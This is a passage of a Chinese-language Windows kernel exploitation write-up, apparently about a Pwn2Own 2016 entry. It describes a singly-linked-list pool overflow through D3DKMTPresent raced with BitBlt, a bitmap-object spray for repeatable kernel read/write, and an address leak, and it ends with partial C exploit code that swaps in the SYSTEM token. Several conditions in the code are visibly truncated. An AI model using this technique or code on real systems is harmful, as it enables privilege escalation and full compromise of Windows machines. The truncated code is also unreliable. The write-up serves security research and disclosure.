#### 方案2：溢出相邻的单链表头部，转化成单链表利用:
方案1有诸多限制，因为我们只能控制溢出的前0x38字节内容，这意味着减掉padding空间，用于分隔的frag内存池分配项目的长度以及接下来的内存池分配的头部，我们没有多余发挥的空间。
方案2看起来很可行，虽然我们知道Windows内核现在已经强制对双链表进行完整性检查，但是对于单链表没有任何检查，因此我们可以通过覆盖单链表中的next指针达到重定向读写的目标。
为了进一步验证可行性，我们先在头脑里演绎一下方案2的种种可能。上面的几张图已经展示了从单链表中弹出两个history
token的情形，此时我们可以溢出节点B，让它覆盖节点A的头部，然后我们将节点B压回单链表：
当我们把节点A也压回单链表时，接下来会怎样，会不会如我们所料将单链表的读写重定向到被溢出覆盖的next指针处
很遗憾并非如我们所料，这种重定向读写不会发生，因为当我们将节点A压回单链表时，覆盖的QWORD会恢复成指向节点B的指针：
我们回到已经弹出两个节点的状态再尝试另外一种可能： 
这次我们先将节点A压回单链表:
然后我们溢出节点B，以覆盖节点A的头部，因为此时节点A已经被回收进单链表，所以不会再有任何操作可以将子节点A的头部恢复了。现在单链表已经被破坏了，它的第二个元素已经指向了溢出覆盖的QWORD所指向的内存处。:
经过了上面的演绎，我们对方案2信心十足，现在我们就开始动手吧！看起来我们必须对单链表乱序调用push和pop，至少要有两次连续的pop，我做了如下的尝试：
#### 尝试1：循环调用D3DKMTPresent并传入可导致溢出的buffer。
结果失败了，经过调试发现每次都在重复pop节点A，使用后push节点A这个循环，根本不会产生乱序。原因很简单，循环调用D3DKMTPresent被逐个响应，所以我们必须同时调用它才能产生乱序。
#### 尝试2：在多线程中循环调用D3DKMTPresent并传入可导致溢出的buffer。
结果又失败了，经过一些简单的逆向分析，D3DKMTPresent的调用路径应该是被加锁保护了。
经历了两次挫败，不免开始怀疑人生，是否会出现两次连续的pop呢？然后很快就意识到绝对可行，肯定是我姿势不对，否则这相对复杂的单链表就退化成单个变量了，肯定有其他的内核调用路径可以激发单链表pop操作。我编写了一个windbg脚本记录每次push和pop操作，然后尝试打开一些图形操作密集的应用程序，只要发现了两次连续的pop就证明发现了第二条路径。经过简单的尝试，奇迹出现了，当我打开Solitaire游戏时，两次pop出现了，经过简单的调试，发现
**BitBlt** API会触发第二条pop的内核路径。
#### 尝试3：在多线程中循环调用D3DKMTPresent并传入可导致溢出的buffer，同时在另外一批多线程中循环调用BitBlt。
这一次终于成功地将单链表中的next指针重定向到指定位置，达到了内核态任意地址写的目的。但是这种写的能力有限，很难重复，而我们想要通过DKOM方式偷换令牌需要多次内核读写，而这种矛盾在Pwn2Own
2016的3次尝试总时间15分钟的严苛比赛规则下显得更加突出，我们需要一些其他技巧。
### 其他技巧
#### 如何达到可重复的内核态任意地址读写
为了达到这个目标，我使用win32k的位图bitmap对象作为中间目标。首先向内核态内存中spray大量的bitmap对象，然后猜测它们的位置，并试图通过上面的重定向写技巧修改它们的头部，当我成功地命中第一个bitmap对象后，通过修改它的头部中的buffer指针和长度，让其指向第二个bitmap对象。因此总共需要控制两个bitmap对象，第一个用来控制读写的地址，而第二个用来控制读写的内容。
再详细地讲，我一共向内核内存中spray了4GB的bitmap对象，首先通过喷射大尺寸的256MB的bitmap对象来锁定空间以及引导内存对齐，然后将它们逐个替换成1MB的小尺寸bitmap对象，这些对象肯定位于0x100000的边界处，就使得猜测它们的地址更加简单。
在猜测bitmap对象地址的过程中需要信息泄露来加快猜测速度，这是通过 **user32! gSharedInfo** 完成的。
#### 偷换令牌
有了可重复地任意地址读写的能力后，再加上通过sidt泄露内核模块的地址，我们可以方便地定位到 **nt!PspCidTable**
指向的句柄表，然后从中找出当前进程以及system进程对应的_EPROCESS结构体，进而找到各自的_TOKEN结构的地址，从而完成替换。
#### 部分利用代码
    VOID ThPresent(THREAD_HOST * th)
    {
        SIZE_T hint = 0;
        while (TRUE)
        {
            HIST_TOKEN ht = { 0, };
            HtInitialize(&ht);
            SIZE_T victim_surf_obj = ThNextGuessedAddr(th, ++hint);
            SIZE_T buffer_ptr = victim_surf_obj + 0x200000 + 0x18;
            th->backupBufferPtr1 = victim_surf_obj + 0x258;
            th->backupBufferPtr2 = victim_surf_obj + 0x200000 + 0x258;
            SIZE_T back_offset = 0x10;
            SURFOBJ surf_obj = { 0, };
            surf_obj.cjBits = 0x80;
            surf_obj.pvBits = (PVOID)buffer_ptr;
            surf_obj.pvScan0 = (PVOID)buffer_ptr;
            surf_obj.sizlBitmap.cx = 0x04;
            surf_obj.sizlBitmap.cy = 0x08;
            surf_obj.iBitmapFormat = 0x06;
            surf_obj.iType = 0;
            surf_obj.fjBitmap = 0x01;
            surf_obj.lDelta = 0x10;
            DWORD dwBuff = 0x04800200;
            HtSetBuffer(&ht, 0x18 + th->memberOffset - back_offset, (unsigned char*)&surf_obj, 0x68);
            HtSetBuffer(&ht, 0x70 + th->memberOffset - back_offset, &dwBuff, sizeof(DWORD));
            if (th->memberOffset - back_offset + 0xE8 memberOffset - back_offset, &qwBuff, sizeof(SIZE_T));
                HtSetBuffer(&ht, 0xE8 + th->memberOffset - back_offset, &qwBuff, sizeof(SIZE_T));
            }
            if (th->memberOffset - back_offset + 0x1C0 memberOffset - back_offset, &qwBuff, sizeof(SIZE_T));
                HtSetBuffer(&ht, 0x1C0 + th->memberOffset - back_offset, &qwBuff, sizeof(SIZE_T));
            }
            HtOverflowNextSListEntry(&ht, victim_surf_obj);
            HtTrigger(&ht);
            if (th->triggered)
                break;
        }
    }
    VOID ThTrigger(THREAD_HOST * th)
    {
        SIZE_T i = 0;
        HANDLE threads[TH_MAX_THREADS] = { 0, };
        unsigned char second_buffer[0x78] = { 0, };
        for (SIZE_T i = 0; i triggered)
            {
                break;
            }
            if (i == 9)
            {
                DWORD thread_id = 0;
                threads[i] = CreateThread(NULL, 0, ProbeThreadProc, th, 0, &thread_id);
            }
            else if (i % 3 != 0 && i > 0x10)
            {
                DWORD thread_id = 0;
                threads[i] = CreateThread(NULL, 0, PresentThreadProc, th, 0, &thread_id);
            }           
            else
            {
                DWORD thread_id = 0;
                threads[i] = CreateThread(NULL, 0, BitbltThreadProc, th, 0, &thread_id);
            }
        }
        for (i = 0; i backupBufferPtr2, second_buffer, 0x78);
        ADDR_RESOLVER ar = { 0, };
        ArInitialize(&ar, th);
        SIZE_T nt_addr = ArNTBase(&ar); 
        SIZE_T psp_cid_table_addr = nt_addr + PSP_CIDTABLE_OFFSET;
        SIZE_T psp_cid_table_value;
        ThRead(th, psp_cid_table_addr, &psp_cid_table_value, 0x08);
        SIZE_T psp_cid_table[0x0C] = { 0, };
        ThRead(th, psp_cid_table_value, psp_cid_table, 0x60);
        SIZE_T table_code = psp_cid_table[1];
        SIZE_T handle_count = psp_cid_table[0x0B] & 0x00000000ffffffff;
        SIZE_T curr_pid = GetCurrentProcessId();
        do
        {
            ThParseCidTable(th, table_code, handle_count);
            Sleep(1000);
        } while (th->currentEprocess == NULL || th->systemEprocess == NULL);
        SIZE_T curr_proc = th->currentEprocess;
        SIZE_T system_proc = th->systemEprocess;
        SIZE_T system_token = 0;
        ThRead(th, (system_proc + 0x358), &system_token, 0x08);
        SIZE_T curr_token = 0;
        ThRead(th, (curr_proc + 0x358), &curr_token, 0x08);
        ThWrite(th, (curr_proc + 0x358), &system_token, 0x08);
        ThRead(th, (curr_proc + 0x358), &curr_token, 0x08);
        ThRestore(th);
        Log("elevated\n");
        Sleep(3600000);
        return;
    }
### 参考:
  1. [Rainbow Over the Windows](https://ruxcon.org.au/assets/2016/slides/Rainbow_over_the_Windows.pdf)
  2. [Did You Get Your Token?](https://github.com/long123king/tokenext/blob/master/doc/Did_You_Get_Your_Token.pdf)
  3. [Windows Kernel Exploitation : This Time Font hunt you down in 4 bytes](http://www.slideshare.net/PeterHlavaty/windows-kernel-exploitation-this-time-font-hunt-you-down-in-4-bytes)
  4. [Kernel Pool Exploitation on Windows 7](https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf)
* * *